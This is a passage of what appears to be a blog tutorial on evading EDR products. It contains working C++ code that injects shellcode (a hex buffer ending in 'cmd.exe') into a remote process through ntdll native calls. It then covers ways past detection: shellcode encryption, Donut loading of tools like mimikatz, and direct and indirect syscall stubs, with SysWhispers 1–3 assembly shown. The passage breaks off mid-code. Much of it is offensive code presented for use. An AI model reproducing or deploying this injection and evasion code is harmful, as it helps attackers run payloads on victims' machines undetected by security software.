+"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
+
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+
+"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";
+
+SIZE_T bufSize = sizeof(buf);
+
+SIZE_T bufSize2 = bufSize; //ntallocatevirtualmemory rounds up size to 4k
+
+DWORD pid;
+
+HANDLE hProcess, hThread;
+
+OBJECT_ATTRIBUTES oa;
+
+CLIENT_ID ci;
+
+PVOID pAllocatedMemory = NULL;
+
+NTSTATUS status = 0x0;
+
+ULONG&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; flProtect = NULL;
+
+SIZE_T sNumberOfBytesWritten = 0;
+
+pNtOpenProcess myNtOpenProcess =
+
+(pNtOpenProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcess");
+
+pNtAllocateVirtualMemory myNtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
+
+pNtWriteVirtualMemory myNtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
+
+pNtProtectVirtualMemory myNtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
+
+pNtCreateThreadEx myNtCreateThreadEx =
+
+(pNtCreateThreadEx)GetProcAddress(GetModuleHandleA("ntdll.dll"),
+
+"NtCreateThreadEx");
+
+pid = atoi(argv&#91;1]);
+
+InitializeObjectAttributes(&amp;oa, NULL, 0, NULL, NULL);
+
+ci.UniqueProcess = (PVOID)pid;
+
+ci.UniqueThread = 0;
+
+if (!NT_SUCCESS(status=myNtOpenProcess(&amp;hProcess, PROCESS_ALL_ACCESS, &amp;oa, &amp;ci))) {
+
+std::cout &lt;&lt; "Could not open process: " &lt;&lt; status; exit(1);
+
+}
+
+status = myNtAllocateVirtualMemory(hProcess, &amp;pAllocatedMemory, 0, &amp;bufSize2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+if (pAllocatedMemory == NULL) {
+
+std::cout &lt;&lt; "could not allocate memory: " &lt;&lt; status; exit(1);
+
+}
+
+myNtWriteVirtualMemory(hProcess, pAllocatedMemory, buf, bufSize, &amp;sNumberOfBytesWritten);
+
+if (sNumberOfBytesWritten != bufSize) {
+
+std::cout &lt;&lt; bufSize&lt;&lt; std::endl;
+
+std::cout &lt;&lt; "could not write to allocated memory: " &lt;&lt; sNumberOfBytesWritten;
+
+};
+
+status = myNtProtectVirtualMemory(hProcess, &amp;pAllocatedMemory, &amp;bufSize, PAGE_EXECUTE_READ, &amp;flProtect);
+
+if (!NT_SUCCESS(status=myNtCreateThreadEx(&amp;hThread, 0x1FFFFF, NULL, hProcess, (LPTHREAD_START_ROUTINE)pAllocatedMemory, NULL, FALSE, NULL, NULL, NULL, NULL))) {
+
+std::cout &lt;&lt; "could not create remote thread: " &lt;&lt; status; exit(1);
+
+};
+
+std::cout &lt;&lt; "successfully injected to " &lt;&lt; pid &lt;&lt; " at virtual memory " &lt;&lt; pAllocatedMemory &lt;&lt; std::endl;
+
+getchar();
+
+}</code></pre>
+
+
+
+<p class="wp-block-paragraph"><strong>high level breakdown of the code :</strong></p>
+
+
+
+<p class="wp-block-paragraph">In above code we are using Windows Native api to resolve the address of the functions in ntdll.dll files to run the program .</p>
+
+
+
+<p class="wp-block-paragraph">The program above waits for user to attach EDR.dll file which will apply userland hooks over the program .</p>
+
+
+
+<p class="wp-block-paragraph">The programs then allocate virtual memory in the <strong>remote process</strong> using NtOpenProcess and NtAllocateVirtualMemory</p>
+
+
+
+<p class="wp-block-paragraph">Program now supplies our shellcode to allocated region of remote process and give nessarry permission to execute it using NtProtectVirtualMemory</p>
+
+
+
+<p class="wp-block-paragraph">Then program run the shellcode using NtCreateThreadEx in context of remote process.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>POC on How Userland Hooks in EDRs Detect syscalls</strong></p>
+
+
+
+<p class="wp-block-paragraph">First we have compile our main malware program , which uses the concept of Remote Process Inject , where we have to specify the &lt;\PID&gt; of remote process as an argument to our malware program.</p>
+
+
+
+<p class="wp-block-paragraph">Afte we compile our malware program from the above code , we can the program as malware.exe &lt;pid&gt; , here PID can be any PID for remote process injection , for the</p>
+
+
+
+<p class="wp-block-paragraph">demonstration purpose will will use notpad.exe pid . open the notepad in background and gets its pid.</p>
+
+
+
+<p class="wp-block-paragraph">After Running the Program with that PID , it will ask for dll to inject into the process which is actually running the malware ( here EDR_EVASION.exe )</p>
+
+
+
+<p class="wp-block-paragraph">we have to use our edr.dll file which we generate earlier , that will applies hook over usage of NtAllocateVirtualMemory</p>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>detected NTAllocateVirtualMemory</td></tr></tbody></table></figure>
+
+
+
+<figure class="wp-block-table"><table><tbody><tr><td>EDR HOOK INSTALLED</td></tr></tbody></table></figure>
+
+
+
+<p class="wp-block-paragraph">after sucessfully hooking our program with apropiated dll file , we will ge reponse in prompt</p>
+
+
+
+<p class="wp-block-paragraph">Now if try to run the program (press enter again) , it will gets detected by EDR.dll file , stating</p>
+
+
+
+<p class="wp-block-paragraph">Although , here we allowed remote process injection , and then unhook the dll file, but the full fldge EDR will going to stop the execution flow and never let the shellcode run !!</p>
+
+
+
+<p class="wp-block-paragraph"><strong>EDR Evasion / Evasing of EDR Hooking</strong></p>
+
+
+
+<p class="wp-block-paragraph">There are several Techniques that we can use to Bypass EDR detection hooking , but before moving to hurestic detection bypasses , we first have to bypass static signature dection on EDR :</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Static Detection Bypasses :</strong></p>
+
+
+
+<p class="wp-block-paragraph">Encrypting Shellcode</p>
+
+
+
+<p class="wp-block-paragraph">Encoding Shellcode</p>
+
+
+
+<p class="wp-block-paragraph">The first step always comes in evasion is using great shellcode, that are not flagged by AV/EDR . the shellcode generate by various C2 are heavily flagged eg (msfvenom,sliver,convenent,mythic) , though they provide there default encryption/encoding mechanism , but thier signature are heavily flagged. so we have used our custom encryption and encoding on shellcode. While there are several tools out there , we can use<a href="https://github.com/arimaqz/strfile-encryptor"> https://github.com/arimaqz/strfile-encryptor</a> . which helps in XOR Encoding and AES Encryption on shellcode ( shellcode it must be in a file in raw format)</p>
+
+
+
+<p class="wp-block-paragraph">Converting .NET assemblies to raw .bin code . <strong>Donut</strong> is a shellcode generation tool that creates x86 or x64 shellcode payloads from .NET Assemblies (eg: mimikatz.exe, covenent agents) . This shellcode may be used to inject the Assembly into arbitrary Windows processes. Given an arbitrary .NET Assembly, parameters, and an entry point (such as Program.Main), it produces position-independent shellcode that loads it from memory. The .NET Assembly can either be staged from a URL or stageless by being embedded directly in the shellcode. Either way, the .NET Assembly is encrypted with the <strong>Chaskey block cipher and a 128-bit randomly generated key</strong>. After the Assembly is loaded through the CLR, the original reference is erased from memory to deter memory scanners. The Assembly is loaded into a new Application Domain to allow for running Assemblies in disposable AppDomains.</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Dynamic Detection / EDR Hooking Bypass</strong></p>
+
+
+
+<p class="wp-block-paragraph">Direct system calls</p>
+
+
+
+<p class="wp-block-paragraph">syswhisper</p>
+
+
+
+<p class="wp-block-paragraph">hell&#8217;s gate</p>
+
+
+
+<p class="wp-block-paragraph">hallo&#8217;s gate</p>
+
+
+
+<p class="wp-block-paragraph">tartarus gate</p>
+
+
+
+<p class="wp-block-paragraph">Indirect system calls</p>
+
+
+
+<p class="wp-block-paragraph">perun&#8217;s fart</p>
+
+
+
+<p class="wp-block-paragraph">API-unhooking</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Direct Syscalls</strong></p>
+
+
+
+<p class="wp-block-paragraph">The use of Direct Syscalls allows an attacker to execute shellcode on windows operating system in such a way that the system calls is not dependent on ntdll.dll , instead this system call is passed as a stub inside PE&#8217;s(malware portable executalbe) resource section like .rsc or .txt section in form of the <strong>assembly instructions</strong> . Syscalls hooking by EDR can be Evaded by obtaining the syscall function coded in the assembly language and calling that crafted syscall directly from within the assembly file.</p>
+
+
+
+<p class="wp-block-paragraph">The point here is SSN (sysetm service number) is varies from system to system. To overcome this problem, the SSN can be either hard-coded in the assembly file or calculated dynamically during runtime.Tools suchs as <strong>syswhispers</strong> , <strong>HellsGate</strong>, <strong>HallosGate</strong>, <strong>Tartarus gate</strong> can be ustilized in this techniques .Here is A sample crafted<strong> </strong>syscall in an assembly file ( .asm ) :</p>
+
+
+
+<pre class="wp-block-code"><code>NtAllocateVirtualMemory PROC
+
+mov r10, rcx
+
+mov eax, (ssn of NtAllocateVirtualMemory)
+
+syscall
+
+ret
+
+NtAllocateVirtualMemory ENDP
+
+NtProtectVirtualMemory PROC
+
+mov r10, rcx
+
+mov eax, (ssn of NtProtectVirtualMemory)
+
+syscall
+
+ret
+
+NtProtectVirtualMemory ENDP</code></pre>
+
+
+
+<p class="wp-block-paragraph">// other syscalls &#8230;</p>
+
+
+
+<p class="wp-block-paragraph"><strong>Indirect Syscalls</strong></p>
+
+
+
+<p class="wp-block-paragraph">The indirect syscalls are implemented in same way direct syscalls are implemented where assembly files are first manually crafted , the difference lies is that in indirect syscalls , syscalls are not used directly , instead we use jmp instruction in its assemby file to jump the function of ntddl.dll . Thus code will ultimatly will be running in address space of ntdll.dll , Thus it wont be flagged sucpicious for EDR.</p>
+
+
+
+<p class="wp-block-paragraph">The assembly functions for NtAllocateVirtualMemory and NtProtectVirtualMemory are :</p>
+
+
+
+<pre class="wp-block-code"><code>NtAllocateVirtualMemory PROC
+
+mov r10, rcx
+
+mov eax, (ssn of NtAllocateVirtualMemory) jmp (address of a syscall instruction) ret
+
+NtAllocateVirtualMemory ENDP
+
+NtProtectVirtualMemory PROC
+
+mov r10, rcx
+
+mov eax, (ssn of NtProtectVirtualMemory)
+
+jmp (address of a syscall instruction)
+
+ret
+
+NtProtectVirtualMemory ENDP
+
+// other syscalls ...</code></pre>
+
+
+
+<p class="wp-block-paragraph">so, in indirect syscalls we want to dynamically extract not only the SSN (service security number) , but also the memory address of the syscall instruction from ntdll.dll .</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers is a toolkit developed for Windows operating systems that facilitates direct syscall invocation. By directly making syscalls, developers can bypass standard API calls, which can be useful for various purposes, including low-level system manipulation and rootkit development. SysWhisper comes in three versions, each with its own set of features and capabilities.</p>
+
+
+
+<p class="wp-block-paragraph">“Why call the kernel when you can whisper?”</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers1:</p>
+
+
+
+<p class="wp-block-paragraph">The first version of SysWhispers laid the foundation for direct syscall invocation on Windows systems. It provided a basic understanding of how to make syscalls directly, bypassing the traditional API calls. The SSNs are retrieved from Windows System Syscall Table and hardcoded in the asm files generated by SysWhispers1:</p>
+
+
+
+<pre class="wp-block-code"><code>.code
+
+NtAllocateVirtualMemory PROC
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov rax, gs:&#91;60h] &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Load PEB into RAX.
+
+NtAllocateVirtualMemory_Check_X_X_XXXX: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Check major version.
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+118h], 5
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_5_X_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+118h], 6
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_Check_6_X_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+118h], 10
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_Check_10_0_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_SystemCall_Unknown
+
+NtAllocateVirtualMemory_Check_6_X_XXXX: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Check minor version for Windows Vista/7/8.
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+11ch], 0
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_Check_6_0_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+11ch], 1
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_Check_6_1_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+11ch], 2
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_2_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp dword ptr &#91;rax+11ch], 3
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_3_XXXX
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_SystemCall_Unknown
+
+NtAllocateVirtualMemory_Check_6_0_XXXX: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Check build number for Windows Vista.
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 6000
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_0_6000
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 6001
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_0_6001
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 6002
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_0_6002
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_SystemCall_Unknown
+
+NtAllocateVirtualMemory_Check_6_1_XXXX: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Check build number for Windows 7.
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 7600
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_1_7600
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 7601
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_6_1_7601
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_SystemCall_Unknown
+
+NtAllocateVirtualMemory_Check_10_0_XXXX:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Check build number for Windows 10.
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 10240
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_10240
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 10586
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_10586
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 14393
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_14393
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 15063
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_15063
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 16299
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_16299
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 17134
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_17134
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 17763
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_17763
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 18362
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_18362
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 18363
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_18363
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 19041
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_19041
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 19042
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_19042
+
+&nbsp;&nbsp;&nbsp;&nbsp;cmp word ptr &#91;rax+120h], 19043
+
+&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp; NtAllocateVirtualMemory_SystemCall_10_0_19043
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_SystemCall_Unknown
+
+NtAllocateVirtualMemory_SystemCall_5_X_XXXX:&nbsp; &nbsp; &nbsp; ; Windows XP and Server 2003
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_0_6000:&nbsp; &nbsp; &nbsp; ; Windows Vista SP0
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_0_6001:&nbsp; &nbsp; &nbsp; ; Windows Vista SP1 and Server 2008 SP0
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_0_6002:&nbsp; &nbsp; &nbsp; ; Windows Vista SP2 and Server 2008 SP2
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_1_7600:&nbsp; &nbsp; &nbsp; ; Windows 7 SP0
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_1_7601:&nbsp; &nbsp; &nbsp; ; Windows 7 SP1 and Server 2008 R2 SP0
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0015h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_2_XXXX:&nbsp; &nbsp; &nbsp; ; Windows 8 and Server 2012
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0016h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_6_3_XXXX:&nbsp; &nbsp; &nbsp; ; Windows 8.1 and Server 2012 R2
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0017h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_10240:&nbsp; &nbsp; ; Windows 10.0.10240 (1507)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_10586:&nbsp; &nbsp; ; Windows 10.0.10586 (1511)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_14393:&nbsp; &nbsp; ; Windows 10.0.14393 (1607)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_15063:&nbsp; &nbsp; ; Windows 10.0.15063 (1703)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_16299:&nbsp; &nbsp; ; Windows 10.0.16299 (1709)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_17134:&nbsp; &nbsp; ; Windows 10.0.17134 (1803)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_17763:&nbsp; &nbsp; ; Windows 10.0.17763 (1809)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_18362:&nbsp; &nbsp; ; Windows 10.0.18362 (1903)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_18363:&nbsp; &nbsp; ; Windows 10.0.18363 (1909)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_19041:&nbsp; &nbsp; ; Windows 10.0.19041 (2004)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_19042:&nbsp; &nbsp; ; Windows 10.0.19042 (20H2)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_10_0_19043:&nbsp; &nbsp; ; Windows 10.0.19043 (21H1)
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov eax, 0018h
+
+&nbsp;&nbsp;&nbsp;&nbsp;jmp NtAllocateVirtualMemory_Epilogue
+
+NtAllocateVirtualMemory_SystemCall_Unknown: &nbsp; &nbsp; &nbsp; ; Unknown/unsupported version.
+
+&nbsp;&nbsp;&nbsp;&nbsp;ret
+
+NtAllocateVirtualMemory_Epilogue:
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov r10, rcx
+
+&nbsp;&nbsp;&nbsp;&nbsp;syscall
+
+&nbsp;&nbsp;&nbsp;&nbsp;ret
+
+NtAllocateVirtualMemory ENDP
+
+End</code></pre>
+
+
+
+<p class="wp-block-paragraph">As you can see, SSN values for every supported Windows version are hardcoded in the asm file.</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers2:</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;The second version improved upon the original by introducing dynamic syscall resolution. This means that it could automatically identify and invoke syscalls on various Windows versions, providing a more versatile and user-friendly experience:</p>
+
+
+
+<pre class="wp-block-code"><code>.data
+
+currentHash DWORD 0
+
+.code
+
+EXTERN SW2_GetSyscallNumber: PROC
+
+WhisperMain PROC
+
+pop rax
+
+mov &#91;rsp+ 8], rcx&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Save registers.
+
+mov &#91;rsp+16], rdx
+
+mov &#91;rsp+24], r8
+
+mov &#91;rsp+32], r9
+
+sub rsp, 28h
+
+mov ecx, currentHash
+
+call SW2_GetSyscallNumber
+
+add rsp, 28h
+
+mov rcx, &#91;rsp+ 8]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Restore registers.
+
+mov rdx, &#91;rsp+16]
+
+mov r8, &#91;rsp+24]
+
+mov r9, &#91;rsp+32]
+
+mov r10, rcx
+
+syscall&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Issue syscall
+
+ret
+
+WhisperMain ENDP
+
+NtAllocateVirtualMemory PROC
+
+mov currentHash, 0208A1E3Eh ; Load function hash into global variable.
+
+call WhisperMain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Resolve function hash into syscall number and make the call
+
+NtAllocateVirtualMemory ENDP
+
+end</code></pre>
+
+
+
+<p class="wp-block-paragraph">Resulting in fewer lines and no hardcoded SSN values, Syswhispers2 is able to dynamically find the SSN values. SysWhispers2 uses sorting by system call address method to find the SSN. This is done by finding all syscalls starting with Zw and saving their address in an array in ascending order. The SSN will become the index of the system call stored in the array.</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers3:</p>
+
+
+
+<p class="wp-block-paragraph">SysWhispers3 is introduced in a blog titled as “Syswhispers is dead, Long live Syswhispers”.</p>
+
+
+
+<p class="wp-block-paragraph">Unlike its predecessors, SysWhispers3 makes indirect syscalls where it searches for syscall instruction ntdll address space and jumps to that instruction instead of directly invoking it.</p>
+
+
+
+<p class="wp-block-paragraph">It also includes a jumper randomizer which searches for random functions’ syscall instruction and jumps to them. So in summary the instruction belongs to another function.</p>
+
+
+
+<pre class="wp-block-code"><code>.code
+
+EXTERN SW3_GetSyscallNumber: PROC
+
+NtAllocateVirtualMemory PROC
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov &#91;rsp +8], rcx&nbsp; &nbsp; &nbsp; ; Save registers.
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov &#91;rsp+16], rdx
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov &#91;rsp+24], r8
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov &#91;rsp+32], r9
+
+&nbsp;&nbsp;&nbsp;&nbsp;sub rsp, 28h
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov ecx, 03DB04B4Fh&nbsp; &nbsp; ; Load function hash into ECX.
+
+&nbsp;&nbsp;&nbsp;&nbsp;call SW3_GetSyscallNumber&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Resolve function hash into syscall number.
+
+&nbsp;&nbsp;&nbsp;&nbsp;add rsp, 28h
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov rcx, &#91;rsp+8]&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Restore registers.
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov rdx, &#91;rsp+16]
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov r8, &#91;rsp+24]
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov r9, &#91;rsp+32]
+
+&nbsp;&nbsp;&nbsp;&nbsp;mov r10, rcx
+
+&nbsp;&nbsp;&nbsp;&nbsp;syscall&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; Invoke system call.
+
+&nbsp;&nbsp;&nbsp;&nbsp;ret
+
+NtAllocateVirtualMemory ENDP
+
+End</code></pre>
+
+
+
+<p class="wp-block-paragraph">This asm file calls SW3_GetSyscallAddress which is defined in a C file that SysWhispers3 generates:</p>
+
+
+
+<p class="wp-block-paragraph">EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)</p>
+
+
+
+<p class="wp-block-paragraph">{</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;// Ensure SW3_SyscallList is populated.</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;if (!SW3_PopulateSyscallList()) return NULL;</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;for (DWORD i = 0; i &lt; SW3_SyscallList.Count; i++)</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;{</p>
+
+
+
+<p class="wp-block-paragraph">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (FunctionHash == SW3_SyscallList.Entries[i].Hash)</p>
+
+
+
